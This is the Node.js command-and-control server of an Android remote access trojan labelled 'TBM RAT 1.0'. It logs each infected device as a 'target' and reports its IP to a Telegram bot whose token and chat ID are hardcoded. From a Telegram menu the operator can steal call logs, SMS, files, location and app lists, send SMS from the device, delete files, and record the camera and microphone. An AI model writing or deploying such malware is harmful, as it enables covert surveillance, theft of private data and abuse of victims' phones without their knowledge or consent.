// Required modules
const http = require('http');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const uuid4 = require('uuid');
const axios = require('axios');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');

// Setup
const upload = multer();
const app = express();
app.use(bodyParser.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Telegram Bot config
const chatId = '8302475430'; // তোমার Chat ID
const token = '8266481820:AAEXE4RD5ndccjBve50H-NW4MC38HCd_LoU'; // তোমার Bot Token
const bot = new TelegramBot(token, { polling: true });

// Routes
app.get('/', (req, res) => {
    const serverAddr = `${req.protocol}://${req.get('host')}`;
    res.send(`Server running at ${serverAddr}`);
});

// Upload file and send to Telegram
app.post('/sendFile', upload.single('file'), (req, res) => {
    const fileName = req.file.originalname;
    bot.sendDocument(chatId, req.file.buffer, {}, { filename: fileName, contentType: 'application/txt' })
        .then(console.log);
    res.send(fileName);
});

// Send text to Telegram
app.post('/sendText', (req, res) => {
    bot.sendMessage(chatId, req.body.text, { parse_mode: 'HTML' });
    res.send(req.body.text);
});

// Send location
app.post('/sendLocation', (req, res) => {
    bot.sendLocation(chatId, req.body.lat, req.body.lon);
    res.send(req.body.lat.toString());
});

// WebSocket connection
wss.on('connection', (ws, req) => {
    ws.uuid = uuid4.v4();
    bot.sendMessage(chatId,
        `<b>New Target Connected 📱\n\nID = <code>${ws.uuid}</code>\nIP = ${req.socket.remoteAddress.replaceAll(':', '')}</b>`,
        { parse_mode: 'HTML' }
    );
});

// Keep clients alive
setInterval(() => {
    wss.clients.forEach(client => {
        client.send('be alive');
    });
}, 2000);

// Telegram bot commands
bot.on('message', (msg) => {
    // Start command
    if (msg.text === '/start') {
        bot.sendMessage(chatId, 
            `WELCOME TO TBM RAT 1.0\nFOLLOW MY PAGE: https://www.facebook.com/TeamBlackMinds`, 
            {
                reply_markup: {
                    keyboard: [
                        ['All Client 👥'],
                        ['Action ☄']
                    ]
                }
            }
        );
    }

    // Show all clients
    if (msg.text === 'All Client 👥') {
        let onlineClients = '';
        const size = wss.clients.size;
        if (size > 0) {
            onlineClients += `<b>${size} Online Client</b> ✅\n\n`;
            wss.clients.forEach(client => {
                onlineClients += `<b>ID => </b>${client.uuid}\n\n`;
            });
        } else {
            onlineClients += '<b>No Online Client</b> ❌';
        }
        bot.sendMessage(chatId, onlineClients, { parse_mode: 'HTML' });
    }

    // Show action menu
    if (msg.text === 'Action ☄') {
        if (wss.clients.size > 0) {
            let actions = [
                [{ text: 'Call Log 📞', callback_data: 'cl' }, { text: 'Get Folder / File 📄', callback_data: 'gc' }],
                [{ text: 'Send Sms 💬', callback_data: 'ss' }, { text: 'All Sms 💬', callback_data: 'as' }],
                [{ text: 'Installed Apps 📲', callback_data: 'ia' }, { text: 'Delete Folder / File 🗑', callback_data: 'df' }],
                [{ text: 'Main Camera 📷', callback_data: 'cam1' }, { text: 'Front Camera 🤳', callback_data: 'cam2' }],
                [{ text: 'Mic 1 🎤', callback_data: 'mi1' }, { text: 'Mic 2 🎤', callback_data: 'mi2' }, { text: 'Mic 3 🎤', callback_data: 'mi3' }]
            ];
            wss.clients.forEach(client => {
                bot.sendMessage(chatId, `<b>☄ Select Action For Device :</b>\n&${client.uuid}`, {
                    reply_markup: { inline_keyboard: actions },
                    parse_mode: 'HTML'
                });
            });
        } else {
            bot.sendMessage(chatId, '<b>No Online Client</b> ❌', { parse_mode: 'HTML' });
        }
    }
});

// Callback query handling
bot.on('callback_query', (query) => {
    const data = query.data;
    const clientId = query.message.text.split('&')[1];
    wss.clients.forEach(client => {
        if (client.uuid === clientId) {
            if (data === 'ss') {
                bot.sendMessage(chatId,
                    `<b>Action Send Sms\n🔵 Please Reply\n</b><code>[{"number":"target number","message":"your message"}]</code>`,
                    { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
                );
            } else if (data === 'gf') {
                bot.sendMessage(chatId,
                    `<b>Action Get File / Folder\n🔵 Please Reply</b>`,
                    { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
                );
            } else if (data === 'df') {
                bot.sendMessage(chatId,
                    `<b>Action Delete File / Folder\n🔵 Please Reply</b>`,
                    { reply_markup: { force_reply: true }, parse_mode: 'HTML' }
                );
            } else {
                client.send(data);
            }
        }
    });
});

// Start server and auto-detect URL
server.listen(process.env.PORT || 9000, () => {
    const port = server.address().port;
    console.log(`Server started on port ${port}`);

    // Auto-detect serverAddr
    const serverAddr = `http://localhost:${port}`; // Will be auto-updated by requests
    setInterval(() => { axios.get(serverAddr); }, 120000); // Keep alive ping every 2 mins
});
